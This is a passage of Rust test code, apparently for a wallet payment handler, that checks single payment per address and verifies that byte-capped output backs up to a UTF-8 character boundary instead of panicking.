    assert_eq!(sent.load(Ordering::SeqCst), 1, "the address must still have been paid exactly once");
}

/// The cap is a byte cut, so it can land in the middle of a character. Slicing there would panic the handler - turning
/// a bad wallet into a dropped connection - so the cut backs up to a boundary instead.
#[tokio::test]
async fn attack_6b_capping_output_never_splits_a_character() {
    // Three-byte characters, capped so the cut lands one byte into the last one.
    let text = "€".repeat(testing::OUTPUT_CAP);
    let capped = testing::cap_output(text.as_bytes());
    assert!(capped.len() <= testing::OUTPUT_CAP, "the cap must hold, {} bytes", capped.len());
    // If the cut had split a character, the tail would be a replacement char or the call would have panicked.
    assert!(!capped.contains('\u{FFFD}'), "the cut must back up to a character boundary, not mangle it");
    assert!(capped.chars().all(|c| c == '€'), "every character must survive the cut intact");
    assert_eq!(capped.len() % 3, 0, "a whole number of three-byte characters must remain");

    // And a buffer shorter than the cap is returned unchanged, not padded or truncated.
    assert_eq!(testing::cap_output(b"Txid: abcd"), "Txid: abcd");
}
